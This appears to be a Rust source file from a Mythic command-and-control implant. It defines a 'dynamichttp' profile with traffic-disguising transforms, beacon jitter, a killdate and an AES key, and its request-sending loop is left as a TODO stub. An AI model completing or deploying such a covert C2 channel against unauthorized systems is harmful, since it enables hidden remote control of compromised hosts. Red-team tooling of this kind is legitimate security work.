use crate::profiles;
use crate::structs::{MythicMessage, Profile};
use crate::utils;
use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use chrono::NaiveDate;
use rand::Rng;
use std::collections::HashMap;
use std::sync::atomic::{AtomicBool, AtomicI32, Ordering};
use std::sync::RwLock;
use tokio::sync::mpsc;
use tokio::time::Duration;

// ============================================================================
// Transform & Config Structures
// ============================================================================

#[derive(Debug, Clone, serde::Deserialize)]
pub struct DynTransform {
    pub function: String,
    #[serde(default)]
    pub value: String,
}

#[derive(Debug, Clone, serde::Deserialize)]
pub struct ModifyBlock {
    pub name: String,
    pub value: String,
    #[serde(default)]
    pub transforms: Vec<DynTransform>,
}

#[derive(Debug, Clone, serde::Deserialize)]
pub struct AgentMessageConfig {
    #[serde(default, rename = "urls")]
    pub urls: Vec<String>,
    #[serde(default, rename = "uri")]
    pub uris: Vec<String>,
    #[serde(default)]
    pub agent_headers: HashMap<String, String>,
    #[serde(default)]
    pub query_parameters: Vec<ModifyBlock>,
    #[serde(default)]
    pub cookies: Vec<ModifyBlock>,
    #[serde(default)]
    pub body: Vec<DynTransform>,
    #[serde(default)]
    pub url_functions: Vec<ModifyBlock>,
}

#[derive(Debug, Clone, serde::Deserialize)]
pub struct AgentConfig {
    #[serde(default)]
    pub server_headers: HashMap<String, String>,
    #[serde(default)]
    pub server_cookies: HashMap<String, String>,
    #[serde(default)]
    pub server_body: Vec<DynTransform>,
    #[serde(default, rename = "AgentMessage")]
    pub agent_message: Vec<AgentMessageConfig>,
}

#[derive(Debug, Clone, serde::Deserialize)]
pub struct DynamicHttpC2Config {
    #[serde(rename = "GET")]
    pub get: AgentConfig,
    #[serde(rename = "POST")]
    pub post: AgentConfig,
}

#[derive(Debug, Clone, serde::Deserialize)]
pub struct DynamicHttpInitialConfig {
    #[serde(rename = "callback_interval")]
    pub interval: i32,
    #[serde(rename = "callback_jitter")]
    pub jitter: i32,
    pub killdate: String,
    #[serde(rename = "encrypted_exchange_check")]
    pub encrypted_exchange_check: bool,
    #[serde(rename = "AESPSK")]
    pub aes_psk: String,
    #[serde(flatten)]
    pub c2_config: DynamicHttpC2Config,
}

// ============================================================================
// Transform Application
// ============================================================================

fn apply_dynamic_transform(data: &[u8], transform: &DynTransform) -> Vec<u8> {
    match transform.function.as_str() {
        "base64" => BASE64.encode(data).into_bytes(),
        "prepend" => {
            let mut result = transform.value.as_bytes().to_vec();
            result.extend_from_slice(data);
            result
        }
        "append" => {
            let mut result = data.to_vec();
            result.extend_from_slice(transform.value.as_bytes());
            result
        }
        "random_mixed" => {
            let mut rng = rand::thread_rng();
            let len: usize = transform.value.parse().unwrap_or(10);
            let random: String = (0..len)
                .map(|_| {
                    let idx = rng.gen_range(0..62);
                    let chars = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                    chars[idx] as char
                })
                .collect();
            random.into_bytes()
        }
        "random_number" => {
            let mut rng = rand::thread_rng();
            let len: usize = transform.value.parse().unwrap_or(10);
            let random: String = (0..len)
                .map(|_| {
                    let idx = rng.gen_range(0..10);
                    (b'0' + idx) as char
                })
                .collect();
            random.into_bytes()
        }
        "random_alpha" => {
            let mut rng = rand::thread_rng();
            let len: usize = transform.value.parse().unwrap_or(10);
            let random: String = (0..len)
                .map(|_| {
                    let idx = rng.gen_range(0..52);
                    let chars = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
                    chars[idx] as char
                })
                .collect();
            random.into_bytes()
        }
        "choose_random" => {
            // Choose a random value from a comma-separated list
            let options: Vec<&str> = transform.value.split(',').collect();
            if options.is_empty() {
                return data.to_vec();
            }
            let mut rng = rand::thread_rng();
            let idx = rng.gen_range(0..options.len());
            options[idx].as_bytes().to_vec()
        }
        _ => data.to_vec(),
    }
}

fn reverse_dynamic_transform(data: &[u8], transform: &DynTransform) -> Vec<u8> {
    match transform.function.as_str() {
        "base64" => BASE64.decode(data).unwrap_or_default(),
        "prepend" => {
            let prefix_len = transform.value.len();
            if data.len() > prefix_len {
                data[prefix_len..].to_vec()
            } else {
                Vec::new()
            }
        }
        "append" => {
            let suffix_len = transform.value.len();
            if data.len() > suffix_len {
                data[..data.len() - suffix_len].to_vec()
            } else {
                Vec::new()
            }
        }
        _ => data.to_vec(),
    }
}

// ============================================================================
// DynamicHTTP Profile
// ============================================================================

pub struct DynamicHttpProfile {
    interval: AtomicI32,
    jitter: AtomicI32,
    killdate: RwLock<NaiveDate>,
    encrypted_exchange_check: RwLock<bool>,
    aes_key: RwLock<Option<Vec<u8>>>,
    uuid: RwLock<String>,
    c2_config: RwLock<DynamicHttpC2Config>,
    running: AtomicBool,
    should_stop: AtomicBool,
}

impl DynamicHttpProfile {
    pub fn new(config: DynamicHttpInitialConfig) -> Self {
        let aes_key = if !config.aes_psk.is_empty() {
            BASE64.decode(&config.aes_psk).ok()
        } else {
            None
        };

        let killdate = NaiveDate::parse_from_str(&config.killdate, "%Y-%m-%d")
            .unwrap_or_else(|_| NaiveDate::from_ymd_opt(2099, 12, 31).unwrap());

        Self {
            interval: AtomicI32::new(config.interval),
            jitter: AtomicI32::new(config.jitter),
            killdate: RwLock::new(killdate),
            encrypted_exchange_check: RwLock::new(config.encrypted_exchange_check),
            aes_key: RwLock::new(aes_key),
            uuid: RwLock::new(profiles::get_uuid()),
            c2_config: RwLock::new(config.c2_config),
            running: AtomicBool::new(false),
            should_stop: AtomicBool::new(false),
        }
    }

    fn past_killdate(&self) -> bool {
        let killdate = self.killdate.read().unwrap();
        chrono::Local::now().date_naive() > *killdate
    }
}

#[async_trait::async_trait]
impl Profile for DynamicHttpProfile {
    fn profile_name(&self) -> &str {
        "dynamichttp"
    }

    fn is_p2p(&self) -> bool {
        false
    }

    async fn start(&self) {
        self.running.store(true, Ordering::Relaxed);
        self.should_stop.store(false, Ordering::Relaxed);

        utils::print_debug("DynamicHTTP: Profile starting");

        while !self.should_stop.load(Ordering::Relaxed) && !self.past_killdate() {
            let sleep_time = self.get_sleep_time();
            if sleep_time > 0 {
                tokio::time::sleep(Duration::from_secs(sleep_time as u64)).await;
            }

            if self.should_stop.load(Ordering::Relaxed) {
                break;
            }

            // TODO: Build dynamic HTTP request using c2_config transforms
            // Apply agent message transforms, build URL, set headers/cookies/body
        }

        self.running.store(false, Ordering::Relaxed);
    }

    fn stop(&self) {
        self.should_stop.store(true, Ordering::Relaxed);
    }

    fn set_sleep_interval(&self, interval: i32) -> String {
        self.interval.store(interval, Ordering::Relaxed);
        format!("Updated interval to {}\n", interval)
    }

    fn get_sleep_interval(&self) -> i32 {
        self.interval.load(Ordering::Relaxed)
    }

    fn set_sleep_jitter(&self, jitter: i32) -> String {
        let j = jitter.clamp(0, 100);
        self.jitter.store(j, Ordering::Relaxed);
        format!("Updated jitter to {}%\n", j)
    }

    fn get_sleep_jitter(&self) -> i32 {
        self.jitter.load(Ordering::Relaxed)
    }

    fn get_sleep_time(&self) -> i32 {
        let interval = self.interval.load(Ordering::Relaxed);
        let jitter = self.jitter.load(Ordering::Relaxed);
        if jitter == 0 || interval == 0 {
            return interval;
        }
        let jitter_range = (interval as f64 * jitter as f64 / 100.0) as i32;
        let variation = utils::random_num_in_range(-jitter_range, jitter_range + 1);
        (interval + variation).max(0)
    }

    async fn sleep(&self) {
        let sleep_time = self.get_sleep_time();
        if sleep_time > 0 {
            tokio::time::sleep(Duration::from_secs(sleep_time as u64)).await;
        }
    }

    fn get_kill_date(&self) -> NaiveDate {
        *self.killdate.read().unwrap()
    }

    fn set_encryption_key(&self, new_key: &str) {
        if let Ok(key) = BASE64.decode(new_key) {
            let mut aes_key = self.aes_key.write().unwrap();
            *aes_key = Some(key);
        }
    }

    fn get_config(&self) -> String {
        let interval = self.interval.load(Ordering::Relaxed);
        format!("  Interval: {}s\n  Dynamic HTTP transforms configured\n", interval)
    }

    fn update_config(&self, parameter: &str, value: &str) {
        match parameter {
            "callback_interval" => {
                if let Ok(i) = value.parse::<i32>() {
                    self.interval.store(i, Ordering::Relaxed);
                }
            }
            _ => utils::print_debug(&format!("Unknown DynamicHTTP config: {}", parameter)),
        }
    }

    fn get_push_channel(&self) -> Option<mpsc::Sender<MythicMessage>> {
        None
    }

    fn is_running(&self) -> bool {
        self.running.load(Ordering::Relaxed)
    }
}
